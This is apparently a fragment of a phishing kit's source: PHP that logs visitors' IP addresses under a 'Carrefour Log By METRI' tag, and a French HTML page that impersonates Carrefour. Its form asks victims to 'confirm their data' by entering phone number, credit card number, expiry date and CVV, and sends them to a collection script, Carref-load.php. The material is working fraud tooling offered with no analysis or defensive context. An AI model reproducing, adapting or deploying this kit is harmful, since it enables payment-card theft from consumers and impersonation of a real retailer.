...
$hostname = gethostbyaddr($ip);
            $message = '/== Carrefour Log By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
...
<html style="background: #F0F0F0;" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        ...
        <link rel="icon" type="image/x-icon" href="https://app-digital-guide.online/assets/imgs/favicon.ico">
            ...
            <div class="containerr">
                ...
                <div class="details">
                    ...
                    <div class="content">
                        ...
                        <h3>Confirmer vos données</h3>
                        <form action="<?php echo 'Carref-load.php?token='.$token1; ?>" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="type" value="infos">
                            <div class="form-group row ">
                                <label for="phone" class="col-5">Numéro de téléphone</label>
                                <div class="col-7">
                                    <input type="text" maxlength="10" name="tel" id="phone" value="">
                                </div>
                            </div>
                            <div class="form-group row ">
                                <label for="one" class="col-5">N° Carte credit</label>
                                <div class="col-7">
                                    <input type="text" name="cn" id="one" value="">
                                </div>
                            </div>
                            <div class="form-group row ">
                                <label for="two" class="col-5">Date d'expiration</label>
                                <div class="col-7">
                                    <input type="text" maxlength="7" name="ed" id="two" placeholder="EX : 01 / 23" value="">
                                </div>
                            </div>
                            <div class="form-group row ">
                                <label for="three" class="col-5">Cryptogramme visuel</label>
                                <div class="col-7">
                                    <input type="text" maxlength="3" name="sc" id="three" value="">
                                </div>
                            </div>
